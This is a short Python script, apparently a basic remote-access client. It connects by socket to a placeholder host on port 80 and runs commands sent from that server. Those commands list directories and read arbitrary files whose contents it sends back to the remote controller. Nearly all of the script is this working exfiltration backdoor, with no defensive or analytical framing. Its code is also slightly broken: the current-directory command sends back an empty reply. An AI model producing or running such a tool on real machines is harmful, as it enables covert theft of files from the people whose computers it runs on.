#command list
# view_cwd - will show all files in the directory where the file is running
# custom_dir - will show files from custom directory
#download_files - will download files from directry

import os
import socket

s = socket.socket()
port = 80
host = "HOST" #please enter your Host IP or Name
s.connect((host, port))
print("")
print("Connected to the server successfully")
print("")

#connection has been completed

#command receiving anf execution

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send("".encode())
        print("")
        print("Command has been executed successfully...")
        print("")

    elif command == "custom_dir":
            user_input = s.recv(5000)
            user_input = user_input.decode()
            files = os.listdir(user_input)
            files = str(files)
            s.send(files.encode())
            print("")
            print("Command has been executed successfully...")
            print("")

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("File has been sent succesfully")
        print("")

    else:
            print("")
            print("Command not recognised")
